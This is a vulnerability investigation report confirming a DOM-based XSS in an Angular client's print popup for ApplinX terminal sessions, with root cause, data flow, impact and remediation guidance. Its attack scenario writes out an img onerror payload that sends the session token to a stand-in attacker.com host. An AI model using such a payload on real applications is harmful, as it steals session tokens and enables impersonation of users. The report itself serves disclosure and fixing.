# VULN-004-I: Investigation Report - xss-document-write-print-copy

**Phase**: Inquisitor
**Vulnerability ID**: VULN-004
**Descriptor**: xss-document-write-print-copy
**Assessment**: 2026-08-02-20-57
**Investigated**: 2026-08-02T22:00:00Z
**Analyst**: D4rthB0b-Inquisitor
**Status**: CONFIRMED

---

## Investigation Summary

**Confirmation**: This vulnerability has been CONFIRMED as exploitable.
**Confirmed At**: 2026-08-02T22:00:00Z

**Exploitability**: HIGH

---

## Root Cause Analysis

`formatPrintPage()` in `app.component.ts` line 535 uses `document.write('<div>' + element + '</div>')` where `element` is derived from ApplinX REST API `field.content` via `GXUtils.formatLineText()` without HTML encoding. The print popup is opened with `window.open('', '')` which shares the same origin as the main application, allowing injected JavaScript to access sessionStorage (`gx_token`, `userName`, `oidc_state`). `DomSanitizer` is injected in AppComponent but never used. The copy modal path (Sink 2) is a false positive: `formatCopyPage()` uses `paraElement.innerText = element` (text assignment), which HTML-encodes on subsequent `innerHTML` read.

---

## Attack Scenario

Compromised ApplinX backend sends a terminal field containing: `<img src=x onerror="fetch('https://attacker.com/exfil?t='+sessionStorage.getItem('gx_token'))">`. Authenticated user clicks the Print button. `formatPrintPage()` calls `document.write('<div><img src=x onerror=...></div>')`. Browser executes the onerror handler in the same-origin popup, stealing `gx_token` and exfiltrating it. Attacker uses the token to make authenticated REST API calls, viewing or modifying mainframe terminal session data.

---

## Prerequisites

- ApplinX REST API backend compromised OR MITM on unencrypted REST API channel
- Authenticated user must click the Print button (user interaction required)
- No Content-Security-Policy blocking inline event handlers in popup

---

## Privilege Boundary Analysis

**Starting Privilege**: Compromised ApplinX backend (server-side attacker)
**Achieved Privilege**: Authenticated browser session — access to gx_token, sessionStorage, same-origin API calls
**Boundary Crossed**: YES

---

## Impact Assessment

**Confidentiality**: HIGH
**Integrity**: HIGH
**Availability**: LOW

### Impact Description

Session token (`gx_token` / Bearer auth) stolen. Attacker can impersonate the user for all ApplinX REST API calls: read terminal screens, send keystrokes, access/delete macros, obtain screen data containing mainframe PII. Integrity impact: attacker can modify session state, send keystrokes to mainframe applications.

---

## Data Flow Analysis

**Sources**:
- ApplinX REST API GetScreenResponse fields[].content (server-controlled terminal data)

**Transformations**:
- `generateObjectArray()` copies `field.content` to `obj['data']` — no encoding
- `formatLineText()` / `GXUtils.replaceString()` — plain string operations, no HTML encoding
- `formatPrintPage()` receives `printDetails[]` array of plain strings
- `window.open('', '')` creates same-origin popup

**Sinks**:
- `popupWindow.document.write('<div>' + element + '</div>')` — **CONFIRMED XSS sink**
- `document.getElementById('copyDiv').innerHTML = this.copyData` — FALSE POSITIVE (content is HTML-encoded via innerText assignment path)

---

## Affected Components

### Direct Impact

- **AppComponent.formatPrintPage()**: XSS via `document.write()` with unsanitized terminal content — session hijacking

### Indirect Impact

- **sessionStorage (gx_token, userName, oidc_state)**: Accessible from same-origin print popup — exfiltrable via XSS payload
- **ApplinX REST API**: All authenticated endpoints accessible with stolen gx_token

---

## Remediation Guidance

### Recommended Fix

Replace string concatenation in `document.write()` with safe DOM creation: use `popupWindow.document.createElement('div')` and set `div.textContent = element` (never `innerHTML`). Alternatively use the already-injected `DomSanitizer`: `sanitizer.sanitize(SecurityContext.HTML, element)`. Apply the same fix pattern to any other `document.write()` calls in `formatPrintPage()`.

**Priority**: IMMEDIATE

### Defense-in-Depth Recommendations

1. Replace all `document.write('<div>' + element + '</div>')` with `createElement` + `textContent`
2. Remove or utilize the already-injected `DomSanitizer` for all HTML output paths
3. Add Content-Security-Policy header: `script-src 'self'` to block inline event handlers
4. Consider printing via a server-rendered endpoint instead of client-side popup
5. Audit all remaining `document.write()` and `innerHTML` assignments for server-supplied data

---

## References

**Scan Finding**: [VULN-004-S-scan-finding.md](VULN-004-S-scan-finding.md)

**Threat Model References**:
- TM-003
- TM-006

**Attack Surface References**:
- AS-004

**External References**:
- OWASP XSS Prevention Cheat Sheet — document.write() with user data is dangerous
- CWE-79: Improper Neutralization of Input During Web Page Generation
- Attack chain AC-001: XSS → Token Theft via same-origin print popup

---

**Investigation Complete**: 2026-08-02T22:00:00Z
**Next Phase**: Exploiter (Validation)
**Registry**: [vulnerability-registry.md](../../vulnerability-registry.md)
